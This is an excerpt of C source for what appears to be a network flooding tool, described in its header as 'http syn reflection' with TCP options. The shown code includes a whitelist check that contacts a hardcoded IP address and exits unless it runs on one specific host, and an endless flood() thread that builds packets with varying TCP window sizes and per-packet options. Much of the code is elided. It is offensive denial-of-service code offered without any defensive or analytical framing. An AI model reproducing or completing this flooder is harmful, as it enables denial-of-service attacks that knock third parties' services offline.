// http syn reflection + tcp options.
...
void whitelistcheck()
{
    fprintf(stdout, "Checking whitelist...\n");
    int portno = 22;
    char *hostname = "37.44.238.187";
    ...
    {
        #ifdef DEBUG
            fprintf(stderr, "Error: This script is compiled for a specific host!\n");
        #endif
        exit(0);
    } 
    else 
...
void *flood(void *par1)
{
    ...
    while (1)
    {
        ...
        // setting information to use in our web requests.
        int windows[3] = { 
            29200, 64240, 65535
        };
        ...
        // creating dynamic tcp options per packet.
